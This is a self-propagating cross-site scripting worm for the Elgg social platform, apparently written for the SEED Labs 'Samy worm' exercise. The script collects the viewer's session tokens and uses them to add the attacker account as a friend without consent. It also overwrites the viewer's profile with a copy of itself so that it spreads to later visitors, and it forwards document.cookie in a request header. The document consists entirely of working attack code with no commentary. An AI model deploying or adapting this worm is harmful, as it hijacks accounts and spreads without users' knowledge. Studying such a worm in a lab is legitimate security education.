<script id = "worm" type="text/javascript">
	window.onload = function () {
		var userName=elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;

		//below are variables for worms from instructions
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>"; 
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		//alert(jsCode);

		var descri="&description=Samy+is+my Hero!" + wormCode +"&accesslevel[description]=2";

		//Construct the content of your url.
		var content=token+ts+"&name="+userName+descri; //FILL IN
		var sendurl="http://ec2-54-90-220-11.compute-1.amazonaws.com/action/profile/edit"; 
		var samyGuid=47; 

		if(elgg.session.user.guid!=samyGuid)
		{
			var Ajax=null;
			// Construct the HTTP request to add Samy as a friend
			var friend_sendurl="http://ec2-54-90-220-11.compute-1.amazonaws.com/action/friends/add?friend=47"+ts+token; 
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",friend_sendurl,true);
			Ajax.setRequestHeader("Host","ec2-54-90-220-11.compute-1.amazonaws.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();

			//Create and send Ajax request to modify profile
			//For propogating worms
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","ec2-54-90-220-11.compute-1.amazonaws.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");				

			Ajax.setRequestHeader("Cookie",document.cookie);
			Ajax.setRequestHeader("Refere","http://ec2-54-90-220-11.compute-1.amazonaws.com/profile/"+userName+"/edit");

			Ajax.send(content);
					
		}

	}
</script>